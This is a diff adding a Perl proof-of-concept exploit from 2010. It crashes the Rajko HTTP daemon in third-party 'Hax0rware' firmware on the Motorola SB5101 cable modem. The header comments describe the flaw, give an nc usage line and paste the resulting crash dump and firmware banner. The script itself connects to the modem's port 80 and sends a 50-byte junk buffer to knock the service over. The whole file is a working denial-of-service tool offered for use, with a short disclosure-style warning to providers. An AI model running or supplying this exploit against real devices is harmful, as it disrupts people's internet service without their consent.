@@ -1,0 +1,220 @@
+#!/usr/bin/perl
+
+# Motorola SB5101 Hax0rware Rajko HttpD Remote Exploit PoC
+# Author: Dillon Beresford
+# Date: 6/6/2010
+# Vendor: SBHacker & Motorola
+# Software Link: http://www.sbhacker.net/forum/index.php 
+# Tested on Hax0rware 1.1 R30, R32 and R39
+
+# Description: Motorola SB5101 Hax0rware Rajko HttpD Remote Exploit
+# If an unauthenticated user or attacker sends any number of bytes greater than 1 
+# to port 80 without a proper request line, such as, [ GET /somepath/file.cgi ]
+# the http daemon triggers a crash on thread at 0x8054b9ac Rajko HttpD.
+
+# The developer of Hax0rware said he has used the modem's local ip to bind to the webserver
+# to prevent attackers from triggering the vuln... This seems to be a quick fix atm.
+# I'm sure he will eventually fix the bug and update the firmware.
+
+# Motorola and Cable providers should warn their customers ( there are a number of legit )
+# customers using this firmware for testing. Its important that you let
+# customers know about the risk of third party firmware that isn't open source.
+
+# nc 192.168.100.1 80 <sendsomeevil>
+
+# For debugging telnet into the device 192.168.100.1 and run the poc.
+
+# >>> YIKES... looks like you may have a problem! <<< 
+
+# r0/zero=00000000 r1/at  =fffffffe r2/v0  =805a1800 r3/v1  =00000000
+# r4/a0  =8054aa58 r5/a1  =00000000 r6/a2  =00000000 r7/a3  =00000000
+# r8/t0  =00000000 r9/t1  =807bcae4 r10/t2 =00000041 r11/t3 =000043e0
+# r12/t4 =4d154e68 r13/t5 =00000000 r14/t6 =00000000 r15/t7 =00000005
+# r16/s0 =8054bacc r17/s1 =00000000 r18/s2 =805a1800 r19/s3 =00000000
+# r20/s4 =00000001 r21/s5 =0000002a r22/s6 =8054b848 r23/s7 =00000001
+# r24/t8 =00000000 r25/t9 =00000059 r26/k0 =00000000 r27/k1 =11110017
+# r28/gp =80458fa0 r29/sp =8054b830 r30/fp =8054b960 r31/ra =8054a514
+
+# PC   : 0x8054a534    error addr: 0x00000000
+# cause: 0x00000008    status:     0x1000ff03
+
+# BCM interrupt enable: ffffbff7, status: 00000000
+# Bad PC or SP.  Can't trace the stack.
+
+# Task: Rajko HttpD
+# ---------------------------------------------------
+# ID:               0x0006
+# Handle:           0x8054b9ac
+# Set Priority:     23
+# Current Priority: 23
+# State:            SUSP
+# Stack Base:       0x8054acd4
+# Stack Size:       3280 bytes
+# Stack Used:       1940 bytes
+#                                                                   Stack     Stack    Stack
+#  TaskId               TaskName              Priority   State      Size      Used     Margin
+# ---------- --------------------------------  --------  --------  --------  --------  --------
+# 0x8048f818                     Idle Thread      31         RUN     2048       616      1432
+# 0x805131d0           Network alarm support       6       SLEEP     2256      1232      1024
+# 0x804924c8                 Network support       7       SLEEP     8192      1704      6488
+# 0x80513f20                pthread.00000800      15        EXIT     7852      1104      6748
+# 0x8048a1c8                        tStartup      18       SLEEP    12288      5208      7080
+# 0x8054b9ac                     Rajko HttpD      23        SUSP     3280      1940      1340
+# 0x807f579c      NonVol Device Async Helper      25       SLEEP     3072       504      2568
+# 0x807ebc7c  Motorola Standby Switch Thread      23       SLEEP     4096       440      3656
+# 0x807ea984      Motorola Vendor Ctl Thread      23       SLEEP     4096       512      3584
+# 0x807f64e8                            WDOG      17         RUN     5120      2784      2336
+# 0x807e86b4                 BFC Ping Thread      29       SLEEP     6144       476      5668
+# 0x807e4b3c                   ConsoleThread      27       SLEEP    36864      2172     34692
+# 0x807d687c                         TelnetD      23         RUN     2256      1980       276
+# 0x807c666c                    CfgVB Thread      23       SLEEP     4096       504      3592
+# 0x807c501c                            DHCM      25       SLEEP    16384       512     15872
+# 0x807befac                Event Log Thread      25       SLEEP     8192      2184      6008
+# 0x8079a51c              Time Of Day Thread      23       SLEEP     6144       456      5688
+# 0x8079a98c                CmDocsisIpThread      23       SLEEP     8192       504      7688
+# 0x80793af8                 CmBpiManagerThd      25       SLEEP     8192       508      7684
+# 0x8078ff78                     CmDsxHelper      23       SLEEP     8192       504      7688
+# 0x807abf50               CmDocsisCtlThread      21       SLEEP     8192       608      7584
+# 0x80788e44          Scan Downstream Thread      23       SLEEP     4096      1428      2668
+# 0x80785c20              RateShaping Thread      23       SLEEP     4096       444      3652
+# 0x807f65e0                            CMHL      23       SLEEP     4500       368      4132
+# 0x807f66d8                            CMHH      21       SLEEP     4500       352      4148
+# 0x807f67d0                            ENRX      23         RUN     4500      1028      3472
+# 0x807f68c8                            ENTX      23       SLEEP     4500       784      3716
+# 0x807f69c0                            ELNK      23       SLEEP     4500       320      4180
+# 0x807f6ab8                            USTX      23       SLEEP     4500       340      4160
+# 0x807f6bb0                            USRX      23       SLEEP     4500       372      4128
+# 0x807f6ca8                            UBCT      19       SLEEP     4500       356      4144
+# 0x807f6da0                            USRN      23       SLEEP     4500       340      4160
+# 0x806a5a34              DHCP Client Thread      23       SLEEP    12288       508     11780
+# 0x807f6e98                        IpHalIst      23         RUN     4500       844      3656
+# 0x8069fb98              CmPropaneCtlThread      23       SLEEP     8192      1628      6564
+# 0x8069cf3c                     IGMP Thread      23       SLEEP     4096       456      3640
+# 0x8069b640               NetToMedia Thread      23       SLEEP     4096       796      3300
+# 0x806975a8                     Trap Thread      23       SLEEP    16384       516     15868
+# 0x807f6030                     SNMP Thread      23       SLEEP    20480      1176     19304
+# 0x805a7f0c              DHCP Server Thread      23       SLEEP     8192      1448      6744
+# 0x8047b410                    tNonVolTimer      30       SLEEP     2048      1028      1020
+# Done!
+
+
+#           *         *
+#          ***       ***
+#          ***       ***
+#          ***       ***
+#         *****     *****
+#         *****     *****
+#         *****     *****
+#        *******   *******
+#        *******   *******
+#        *******   *******
+#       ********* *********
+#       ********* *********
+#       ****  *** ***  ****
+#      ***      ***      ***
+#      ***       *       ***
+#      **                 **
+#     **                   **
+#     **                   **
+#    **                     **
+#    *                       *
+#      Motorola  Corporation
+
+# +----------------------------------------------------------------------------+
+# |       _/_/     _/_/_/_/    _/_/                                            |
+# |      _/  _/   _/        _/    _/   Broadband                               |
+# |     _/  _/   _/        _/                                                  |
+# |    _/_/     _/_/_/    _/           Foundation                              |
+# |   _/  _/   _/        _/                                                    |
+# |  _/   _/  _/        _/    _/       Classes                                 |
+# | _/_/_/   _/          _/_/                                                  |
+# |                                                                            |
+# | Copyright (c) 1999 - 2007 Broadcom Corporation                             |
+# |                                                                            |
+# | Revision:  3.9.33.3 RELEASE                                                |
+# |                                                                            |
+# | Features:  Console Nonvol Fat HeapManager SNMP Networking USB1.1           |
+# +----------------------------------------------------------------------------+
+# | Standard Embedded Target Support for BFC                                   |
+# |                                                                            |
+# | Copyright (c) 2003 - 2007 Broadcom Corporation                             |
+# |                                                                            |
+# | Revision:  3.0.1 RELEASE                                                   |
+# |                                                                            |
+# | Features:  PID=0xc011 Bootloader-Rev=2.1.6d                                |
+# | Copyright (c) 2003 - 2007 Broadcom Corporation                             |
+# |                                                                            |
+# | Revision:  3.0.1 RELEASE                                                   |
+# |                                                                            |
+# | Features:  PID=0xc011 Bootloader-Rev=2.1.6d                                |
+# | Features:  Bootloader-Compression-Support=0x19                             |
+# +----------------------------------------------------------------------------+
+# | eCos BFC Application Layer                                                 |
+# |                                                                            |
+# | Copyright (c) 1999 - 2007 Broadcom Corporation                             |
+# |                                                                            |
+# | Revision:  3.0.2 RELEASE                                                   |
+# |                                                                            |
+# | Features:  eCos Console Cmds, (no Idle Loop Profiler)                      |
+# +----------------------------------------------------------------------------+
+# |         _/_/    _/     _/                                                  |
+# |      _/    _/  _/_/ _/_/   DOCSIS Cable Modem                              |
+# |     _/        _/  _/ _/                                                    |
+# |    _/        _/     _/                                                     |
+# |   _/        _/     _/                                                      |
+# |  _/    _/  _/     _/                                                       |
+# |   _/_/    _/     _/                                                        |
+# |                                                                            |
+# | Copyright (c) 1999 - 2005 Broadcom Corporation                             |
+# |                                                                            |
+# | Revision:  3.9.33.3 RELEASE                                                |
+# |                                                                            |
+# | Features:  AckCel(tm) DOCSIS 1.0/1.1/2.0 Propane(tm) CM SNMP w/Factory MIB |
+# | Features:  Support CM Vendor Extension                                     |
+# +----------------------------------------------------------------------------+
+# | Motorola Data-Only CM Vendor Extension                                     |
+# |                                                                            |
+# | Revision:  3.0.0a RELEASE                                                  |
+# |                                                                            |
+# | Features:  DHCP Server  HTTP Server                                        |
+# +----------------------------------------------------------------------------+
+# | Build Date:  Apr 29 2009                                                   |
+# | Build Time:  15:08:51                                                      |
+# | Built By:    vobadm02                                                      |
+# +----------------------------------------------------------------------------+
+
+use strict;
+use Socket;
+
+my $buff = "\x41" x50;
+my $cablemodemip = shift || '192.168.100.1';
+
+my $port = shift || 80;
+
+my $proto = getprotobyname('tcp');
+
+my $iaddr = inet_aton($cablemodemip);
+my $paddr = sockaddr_in($port, $iaddr);
+
+print "+---------------------------------------------------------------+\n".
+      "| Motorola SB5101 Hax0rware Rajko HttpD Remote Exploit PoC      |\n".
+      "| Motorola: SB5101-2.7.6.0-GA-00-NOSH                           |\n".
+      "| Version: 1.1 R30, R32 and R39                                 |\n".
+      "| Vendor: Motorola Corporation and SBHacker                     |\n".
+      "| Author: Dillon Beresford                                      |\n".
+      "| Date: 6/6/2010                                                |\n".
+      "+---------------------------------------------------------------+\n";
+
+socket(SOCKET, PF_INET, SOCK_STREAM, $proto) or die "socket: $!";
+print "[+] Connecting to cable modem httpd at $cablemodemip on port $port\n";
+connect(SOCKET, $paddr) or die "connect: $!";
+
+print "[+] Sending our evil buffer...\n";
+print SOCKET $buff."\n";
+print "[+] Payload sent\n";
+print "[+] This takes some time please wait.\n";
+print "[+] Dont look at me look at the leds on your modem\n";
+close SOCKET or die "close: $!";
+sleep(25);
+print "[+] Bye Bye Motorola SB5101 \n";
+
